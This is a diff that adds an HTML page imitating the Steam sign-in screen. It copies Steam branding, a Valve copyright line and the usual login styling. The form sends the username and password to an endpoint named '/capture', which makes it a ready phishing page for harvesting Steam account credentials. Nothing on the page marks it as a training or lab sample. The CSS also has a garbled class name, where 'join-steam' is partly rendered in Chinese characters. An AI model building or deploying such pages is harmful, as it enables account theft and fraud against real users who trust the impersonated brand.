@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Motiva Sans", "Twemoji", "Arial", sans-serif; }
+        
+        body {
+            background: #171a21;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .login-container {
+            width: 100%;
+            max-width: 600px;
+            padding: 40px;
+        }
+        
+        .logo {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        .logo img { height: 60px; }
+        
+        .login-box {
+            background: #181a21;
+            border-radius: 4px;
+            padding: 24px;
+        }
+        
+        .login-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        
+        .login-header h1 {
+            color: #fff;
+            font-size: 32px;
+            font-weight: 300;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .login-form {
+            max-width: 300px;
+            margin: 0 auto;
+        }
+        
+        .form-group { margin-bottom: 16px; }
+        
+        label {
+            display: block;
+            color: #b8b6b4;
+            font-size: 14px;
+            margin-bottom: 6px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 10px;
+            background: #32353c;
+            border: 1px solid #32353c;
+            border-radius: 2px;
+            color: #fff;
+            font-size: 15px;
+        }
+        input:focus { outline: none; border-color: #66c0f4; }
+        
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #c6d4df;
+            font-size: 14px;
+            margin: 20px 0;
+        }
+        .checkbox-group input { width: auto; }
+        
+        .btn-signin {
+            width: 100%;
+            background: linear-gradient(to right, #47bfff 5%, #1a44c2 60%);
+            color: #fff;
+            border: none;
+            border-radius: 2px;
+            padding: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+        .btn-signin:hover { background: linear-gradient(to right, #6ad1ff 5%, #2a54d6 60%); }
+        
+        .help-links {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .help-links a {
+            color: #afafaf;
+            font-size: 14px;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+        .help-links a:hover { color: #fff; }
+        
+        .join-蒸汽 {
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(0,0,0,0.2);
+            text-align: center;
+            border-radius: 4px;
+            color: #b8b6b4;
+            font-size: 14px;
+        }
+        .join-蒸汽 a {
+            color: #fff;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        .security-note {
+            margin-top: 24px;
+            text-align: center;
+            color: #76808c;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <svg viewBox="0 0 294.54 92.79" width="180" fill="#c5c3c0">
+                <path d="M45.49 0C20.37 0 0 18.84 0 42.08c0 20.99 15.84 38.38 36.47 41.84l9.02 8.87 9.02-8.87C75.14 80.46 90.98 63.07 90.98 42.08 90.98 18.84 70.61 0 45.49 0zm0 15.82c14.39 0 26.07 11.75 26.07 26.26 0 14.51-11.68 26.26-26.07 26.26S19.42 56.59 19.42 42.08c0-14.51 11.68-26.26 26.07-26.26z"/>
+                <path d="M128.07 27.93v8.34h-8.34v34.87h-9.09V36.27h-8.34v-8.34h25.77zM145.34 27.93v43.21h-9.09V27.93h9.09zM188.22 27.93v43.21h-9.09V41.57l-8.34 15.21h-.75l-8.34-15.21v29.57h-9.09V27.93h9.84l8.46 15.33 8.46-15.33h8.85zM219.3 27.93l-12.03 43.21h-9.45l12.03-43.21h9.45zM243.77 27.93v29.14l11.76-29.14h9.45l-12.03 43.21h-9.45V42l-11.76 29.14h-9.45l12.03-43.21h9.45z"/>
+            </svg>
+        </div>
+        
+        <div class="login-box">
+            <div class="login-header">
+                <h1>Sign In</h1>
+            </div>
+            
+            <form class="login-form" action="/capture" method="POST">
+                <div class="form-group">
+                    <label>Steam account name</label>
+                    <input type="text" name="username" placeholder="" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Password</label>
+                    <input type="password" name="password" placeholder="" required>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember" style="margin: 0; cursor: pointer;">Remember me on this computer</label>
+                </div>
+                
+                <button type="submit" class="btn-signin">Sign In</button>
+            </form>
+            
+            <div class="help-links">
+                <a href="#">Forgot your password?</a>
+                <a href="#">Help, I can't sign in</a>
+            </div>
+        </div>
+        
+        <div class="join-steam">
+            Don't have a Steam account? <a href="#">Create a Free Account</a>
+        </div>
+        
+        <div class="security-note">
+            It's free and easy. Discover thousands of games to play with millions of new friends.
+            <br>© Valve Corporation. All rights reserved.
+        </div>
+    </div>
+</body>
+</html>
